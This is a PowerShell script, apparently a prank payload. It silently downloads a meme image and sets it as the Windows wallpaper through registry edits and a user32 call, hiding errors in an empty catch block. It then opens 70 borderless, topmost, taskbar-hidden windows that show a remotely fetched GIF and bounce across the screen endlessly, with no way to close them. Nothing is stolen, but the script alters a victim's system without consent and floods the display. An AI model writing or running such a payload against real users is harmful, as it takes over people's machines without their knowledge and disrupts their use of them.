$ImageUrl = "https://i.kym-cdn.com/entries/icons/facebook/000/056/510/ttgodcover.jpg"
$Style = "Span"

function SetWallPaper {
    param(
        [string]$Image,
        [ValidateSet('Fill','Fit','Stretch','Tile','Center','Span')]
        [string]$Style
    )

    $WallpaperStyle = switch($Style) {
        "Fill"    { "10" }
        "Fit"     { "6" }
        "Stretch" { "2" }
        "Tile"    { "0" }
        "Center"  { "0" }
        "Span"    { "22" }
    }

    Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle $WallpaperStyle

    if ($Style -eq "Tile") {
        Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper 1
    }
    else {
        Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper 0
    }

    Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Unicode)]
    public static extern bool SystemParametersInfo(
        int uAction,
        int uParam,
        string lpvParam,
        int fuWinIni
    );
}
"@

    [Wallpaper]::SystemParametersInfo(20, 0, $Image, 3) | Out-Null
}

try {
    $TempFile = "$env:TEMP\wallpaper.jpg"
    Invoke-WebRequest -Uri $ImageUrl -OutFile $TempFile
    SetWallPaper -Image $TempFile -Style $Style
}
catch {}

$GifUrl = "https://raw.githubusercontent.com/Aas6d54asd/XD/refs/heads/main/angrybird.gif"

$PocetOken = 70
$Sirka = 325
$Vyska = 240
$Rychlost = 1

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$forms = @()
$timers = @()

for ($i = 1; $i -le $PocetOken; $i++) {

    $form = New-Object System.Windows.Forms.Form
    $form.Text = " "
    $form.Size = New-Object System.Drawing.Size($Sirka, $Vyska)
    $form.StartPosition = "Manual"
    $form.FormBorderStyle = "None"
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::Black
    $form.TransparencyKey = [System.Drawing.Color]::Black
    $form.ShowInTaskbar = $false

    $wb = New-Object System.Windows.Forms.WebBrowser
    $wb.Size = $form.ClientSize
    $wb.ScrollBarsEnabled = $false
    $wb.IsWebBrowserContextMenuEnabled = $false
    $wb.Navigate($GifUrl)

    $form.Controls.Add($wb)

    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea

    $form.Left = Get-Random -Minimum 0 -Maximum ($screen.Width - $Sirka)
    $form.Top  = Get-Random -Minimum 0 -Maximum ($screen.Height - $Vyska)

    $directionX = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { -$Rychlost } else { $Rychlost }
    $directionY = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { -$Rychlost } else { $Rychlost }

    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 1

    $timer.Add_Tick({
        $newX = $form.Left + $directionX
        $newY = $form.Top + $directionY

        if ($newX -le 0 -or $newX + $form.Width -ge $screen.Width) {
            $directionX = -$directionX
        }

        if ($newY -le 0 -or $newY + $form.Height -ge $screen.Height) {
            $directionY = -$directionY
        }

        $form.Left = $newX
        $form.Top = $newY
    }.GetNewClosure())

    $forms += $form
    $timers += $timer
}

foreach ($form in $forms) {
    $form.Show()
}

foreach ($timer in $timers) {
    $timer.Start()
}

[System.Windows.Forms.Application]::Run()
